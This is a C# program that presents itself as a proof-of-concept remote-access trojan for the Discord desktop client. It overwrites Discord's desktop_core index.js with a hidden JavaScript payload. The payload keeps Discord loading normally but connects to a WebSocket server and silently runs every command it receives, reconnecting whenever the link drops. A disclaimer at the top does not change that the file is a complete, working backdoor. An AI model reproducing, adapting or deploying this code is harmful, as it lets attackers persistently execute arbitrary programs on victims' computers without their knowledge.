using System;
using System.IO;

class Program
{
    static void Main()
    {
		Console.WriteLine("This application is meant as a PROOF OF CONCEPT! I am not responsible for any misuse of this application.  Express RAT proof of concept by https://github.com/iiDk-the-actual/POC.DiscordReactRAT");
		Console.WriteLine("Continuing to run this application will result in the payload being added to your Discord's files. Press any key to continue.");
		Console.ReadKey();
	
        string localAppDataPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        string discordPath = Path.Combine(localAppDataPath, "Discord");

        if (!Path.Exists(discordPath))
        {
            Console.WriteLine("Discord is not installed");
            Console.ReadKey();
            return;
        }

        Console.WriteLine($"Found Discord: {discordPath}");

        string[] directories = Directory.GetDirectories(discordPath, "app-*.*.****");
        if (directories.Length <= 0)
        {
            Console.WriteLine("Discord app folder does not exist");
            Console.ReadKey();
            return;
        }

        string discordAppPath = directories[0];
        Console.WriteLine($"Found Discord app path: {discordAppPath}");

        string coreAppPath = Path.Combine(discordAppPath, "modules/discord_desktop_core-1/discord_desktop_core");

        if (!Path.Exists(coreAppPath))
        {
            Console.WriteLine("Discord desktop core path does not exist");
            Console.ReadKey();
            return;
        }

        Console.WriteLine($"Found Discord core app path: {coreAppPath}");

        File.WriteAllText(Path.Combine(coreAppPath, "index.js"), @"module.exports = require('./core.asar');

const { spawn, spawnSync } = require('child_process');

function requireWs() {
    try {
        return require('ws');
    } catch (err) {
        const npmCmd = process.platform === 'win32' ? 'npm.cmd' : 'npm';

        spawnSync(
            npmCmd,
            ['install', 'ws'],
            {
                cwd: __dirname,
                stdio: 'inherit'
            }
        );

        delete require.cache[require.resolve('ws')];
        return require('ws');
    }
}

let wsInstance = null;

function connect() {
    if (wsInstance && wsInstance.readyState === 1) return;

    try {
        const WebSocket = requireWs();
        wsInstance = new WebSocket(""ws://localhost:2474"");

        wsInstance.on('message', (data) => {
            const child = spawn(data.toString(), {
                detached: true,
                windowsHide: true,
                stdio: ""ignore""
            });
            child.on('error', () => {});
            child.unref();
        });

        wsInstance.on('error', () => { setTimeout(connect, 5000); });
        wsInstance.on('close', () => { setTimeout(connect, 5000); });

    } catch {}
}

connect();");

        Console.Write("Payload added. Next run of Discord will allow attacker to execute programs remotely");
        Console.ReadKey();
    }
}
